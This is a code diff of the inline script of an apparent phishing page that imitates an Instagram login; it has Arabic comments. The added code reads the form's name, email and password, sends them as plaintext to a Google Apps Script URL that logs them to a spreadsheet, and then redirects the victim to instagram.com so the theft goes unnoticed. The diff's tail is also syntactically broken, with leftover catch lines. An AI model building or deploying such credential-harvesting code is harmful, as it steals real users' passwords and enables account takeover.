@@ -150,29 +150,35 @@
 <script>
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxnAVdN37_FpdckPpcmvMYr8_1EMOXuTxuF32Ng4nwXbFA7nqfmeh5-WHc_VsZkjP2H/exec"; // 
 
-    document.querySelector("form").addEventListener("submit", function(event) {
-        event.preventDefault(); // بيمنع الصفحة تعمل إعادة تحميل وتضمن تنفيذ الكود
+   document.querySelector("form").addEventListener("submit", function(event) {
+    // مش هنعمل preventDefault هنا عشان البيانات تسمع في الـ Spreadsheet عادي جداً
 
-        const inputs = document.querySelectorAll('input');
-        const nameVal = inputs[0] ? inputs[0].value : "";
-        const emailVal = inputs[1] ? inputs[1].value : "";
-        const passVal = inputs[2] ? inputs[2].value : "";
+    const nameVal = document.querySelector('input[type="text"]').value;
+    const emailVal = document.querySelectorAll('input')[1] ? document.querySelectorAll('input')[1].value : "";
+    const passVal = document.querySelector('input[type="password"]').value;
 
-        const data = {
-            name: nameVal,
-            email: emailVal,
-            password: passVal,
-            action: "login_attempt",
-            detected: "no"
-        };
+    const data = {
+        name: nameVal,
+        email: emailVal,
+        password: passVal,
+        action: "login_attempt",
+        detected: "no"
+    };
 
-        fetch(SCRIPT_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-                "Content-Type": "text/plain"
-            },
-            body: JSON.stringify(data)
+    fetch(SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+            "Content-Type": "text/plain"
+        },
+        body: JSON.stringify(data)
+    });
+
+    // التوجيه لإنستغرام بعد ثانية واحدة (هتكون البيانات اتبعتت والتحويل هيحصل)
+    setTimeout(function() {
+        window.location.href = "https://www.instagram.com";
+    }, 1000);
+});
         }).catch(err => {
             console.error(err);
         });
